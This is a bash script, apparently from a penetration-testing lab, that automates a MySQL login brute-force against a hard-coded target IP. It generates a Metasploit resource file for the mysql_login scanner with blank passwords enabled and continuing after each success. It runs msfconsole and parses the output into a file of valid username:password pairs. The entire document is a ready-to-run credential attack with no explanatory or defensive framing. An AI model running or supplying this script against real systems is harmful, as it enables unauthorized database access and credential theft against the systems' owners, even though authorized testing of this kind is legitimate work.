#!/bin/bash

TARGET="172.16.17.3"

echo "[*] Starting MySQL Login Enumeration against $TARGET..."

#############################################
# 1) Create RC file for the MySQL login scan
#############################################

cat > mysql_enum.rc <<EOF
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $TARGET
set BLANK_PASSWORDS true
set STOP_ON_SUCCESS false
run
exit
EOF

#############################################
# 2) Run the generated RC file
#############################################

msfconsole -q -r mysql_enum.rc > mysql_enum_output.txt

echo "[*] Scan finished. Parsing results..."

#############################################
# 3) Extract valid MySQL logins from output
#############################################

grep "LOGIN SUCCESSFUL" mysql_enum_output.txt \
    | sed -E "s/.*LOGIN SUCCESSFUL: '([^']+)' : '([^']+)'.*/\1:\2/" \
    > valid_mysql_creds.txt

if [ ! -s valid_mysql_creds.txt ]; then
    echo "[-] No MySQL logins found."
    exit 1
fi

#############################################
# 4) Display results
#############################################

echo "[+] Valid MySQL credentials:"
sed 's/^/    - /' valid_mysql_creds.txt

echo "[*] Results saved in valid_mysql_creds.txt"
